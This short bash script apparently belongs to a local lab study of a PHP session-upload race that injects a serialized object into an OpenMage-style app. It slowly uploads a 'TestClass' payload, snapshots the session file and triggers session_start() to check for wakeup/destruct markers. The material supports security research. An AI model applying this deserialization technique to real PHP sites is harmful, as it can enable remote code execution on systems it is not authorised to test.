#!/bin/bash
# Step-1 T2 retry: slow upload of the TestClass session value (php_serialize
# writer), read the live session file, trigger the app session_start().
set -u
R=/tmp/opencode/research/openmage_pop_20261022T021222Z
cd "$R" || exit 1
SID=t2retry
S=www/var/session/sess_$SID
rm -f "$S" MARK_WAKEUP MARK_DESTRUCT
python3 scripts/upload_probe.py --port 28896 --path /lab_upload_sink.php --sid "$SID" \
    --payload-file phase/payload_testclass.bin --size 1048576 --mode slow --pause-at 262144 \
    --pause-seconds 10 --session-file "$S" --outdir phase > phase/t2retry_upload.out 2>&1 &
PID=$!
for i in $(seq 1 200); do
    if [ -f "$S" ] && [ "$(stat -c%s "$S" 2>/dev/null || echo 0)" -gt 300 ]; then break; fi
    sleep 0.05
done
cp -a "$S" phase/t2retry_sess_at_read.bin 2>/dev/null || true
stat -c '%s bytes %n' phase/t2retry_sess_at_read.bin 2>/dev/null || echo "no copy"
python3 scripts/get_app.py 28896 "$SID" / req/t2retry_reader
wait $PID
echo "---- upload log ----"
cat phase/t2retry_upload.out
echo "---- markers ----"
cat markers/testclass_wakeup.log markers/testclass_destruct.log 2>/dev/null | tail -4
ls -la MARK_WAKEUP MARK_DESTRUCT 2>&1
